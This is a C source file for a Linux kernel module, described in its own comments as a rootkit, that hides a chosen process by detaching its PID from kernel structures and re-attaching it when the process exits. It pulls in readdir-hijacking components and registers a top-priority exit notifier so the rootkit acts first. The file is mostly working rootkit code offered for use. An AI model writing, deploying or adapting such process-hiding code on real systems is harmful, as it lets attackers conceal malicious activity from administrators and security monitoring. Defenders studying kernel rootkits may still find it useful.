#include <linux/pid.h>
#include <linux/sched.h> // for task_struct
#include <linux/rculist.h>
#include <linux/profile.h>
#include <linux/kernel.h>

#include "common.h"
#include "processHider.h"
#include "readdirHijack.h"
#include "processHiderPidManipulation.h"

#ifndef CONFIG_PROFILING
	#error "this module requires config profiling enabled"
#endif

//todo: prevent hiding processes that are already hidden..  test this..


//todo: group these to allow hiding multiple tasks..
struct restorableHiddenTask { //TODO: rename this
	void *task;
	struct pid *originalPid;
};

struct restorableHiddenTask onlyHiddenTask = {NULL};

// Function Prototypes
static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(struct pid *pid);
static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task);
static int isTaskHidden(void *task);
static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask *taskToRestore);
//



struct notifier_block notificationOnProcessExit = {
	.notifier_call = notificationFunctionOnTaskExit,
	.next = NULL,// TODO: CHECK THIS
	.priority = INT_MAX, // if there are multiple tasks registered for exit notifications it is desirable that the rootkit is called first so that it can restore the task.
};

//TODO: move this higher in the file
int processHider_init(void) {
	// this will fail if profiling is disabled
	int error = profile_event_register(PROFILE_TASK_EXIT, &notificationOnProcessExit);
	if (error != 0) { //todo : extract function..
		return error;
	}

	return 0;
}


void processHider_exit(void) {
	// show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
   //unhijack_readdir();
	// TODO: show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
		// alternatively kill them / require that the tasks are dead first..

	//TODO: check there is no race condition when exiting e.g. if a process exits at the same time

	int error;
	rcu_read_lock();

	error = profile_event_unregister(PROFILE_TASK_EXIT, &notificationOnProcessExit);

	// unhide hidden tasks
	if (onlyHiddenTask.task != NULL) { // is a task still hidden..
		restoreTaskGivenRcuLockIsHeld(&onlyHiddenTask);
	}

	rcu_read_unlock();
}

//returns error code...
//PRESENTLY ONLY SUPPORTS HIDING ONE PROCESS
int hideProcess(int pidNumber) {
	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
	if (pid == NULL) {
		return -1;
	}
	
	rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
	
	if (onlyHiddenTask.task != NULL) {
		printError("warning another task was already hidden - this is not supported properly yet\n");
		return -1;
	}

	onlyHiddenTask = hideProcessGivenRcuLockIsHeld(pid);
	if (onlyHiddenTask.task == NULL) {
		printError("failed to hide task\n");
	}
	
	rcu_read_unlock();
	
	return 0;
}

int showProcess(int pid) {
	rcu_read_lock();

	// unhide hidden tasks
	if (onlyHiddenTask.task != NULL) { // is a task still hidden..
		restoreTaskGivenRcuLockIsHeld(&onlyHiddenTask);
	}

	rcu_read_unlock();
	return 0;
}

static struct restorableHiddenTask createRestorableTask(struct task_struct *task, struct pid *originalPid) {
	struct restorableHiddenTask result = {
		.task = task,
		.originalPid = originalPid,
	};
	return result;
}

static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(struct pid *pid) {
	struct task_struct *task = pid_task(pid, PIDTYPE_PID);
	struct pid *originalPid;

	if (task != NULL) {
		originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
	} else {
		originalPid = NULL;
	}

	return createRestorableTask(task, originalPid);
}

static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
	//printInfo("in notification function for exit - task is %p\n", task);
	if (isTaskHidden(task)) {
		//TODO: add support for hiding multiple tasks / get restorable task struct that corresponds to pid..

		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h

		restoreTaskGivenRcuLockIsHeld(&onlyHiddenTask);

		rcu_read_unlock();
	}

	return 0;
}

static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask *taskToRestore) {
	printInfo("Unhiding task\n");
	attach_pid(taskToRestore->task, PIDTYPE_PID, taskToRestore->originalPid);
	taskToRestore->task = NULL; //mark as no longer hidden
}


static int isTaskHidden(void *task) {
	return (task == onlyHiddenTask.task);
}

